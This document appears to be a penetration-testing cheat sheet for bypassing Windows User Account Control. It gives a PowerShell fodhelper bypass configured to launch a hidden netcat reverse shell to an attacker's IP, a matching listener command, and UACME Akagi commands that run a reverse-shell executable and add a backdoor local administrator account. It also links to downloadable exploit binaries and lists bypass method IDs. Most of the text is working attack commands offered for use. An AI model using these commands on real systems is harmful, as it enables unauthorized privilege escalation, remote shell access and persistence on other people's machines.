# Bypass UAC 

Before importing the file, please edit the "**BypassUACfodhelper.ps1**" file in the following section:: 

```
$CMD = "powershell -windowstyle hidden C:\Windows\Temp\nc.exe YOURIP 1337 -e cmd"
```

### Execute
```
kali@unix:/$ rlwrap nc -lvp 1337
```

```
Windows (Poweshell)> . .\BypassUACfodhelper.ps1
Windows (Poweshell)> UACBypass1
OR
Windows (Poweshell)> UACBypass2
```

## Alternative: UACME

Download binary Akagi64.exe or Akagi32.exe: [https://github.com/yuyudhn/UACME-bin](https://github.com/yuyudhn/UACME-bin)

### Execute
```
Windows (CMD)> Akagi64.exe 33
OR
Windows (CMD)> Akagi64.exe 53 C:\Windows\Temp\rev.exe
OR
Windows (CMD)> Akagi64.exe 61 "net user 0xshdax passW0rd! /add"
```
### Basic UACME

| Method Id | Bypass technique                        |
|-----------|-----------------------------------------|
|     33    |              fodhelper.exe              |
|     34    |        DiskCleanup scheduled task       |
|     70    | fodhelper.exe using CurVer registry key |

Read more UACME: [https://github.com/hfiref0x/UACME](https://github.com/hfiref0x/UACME)
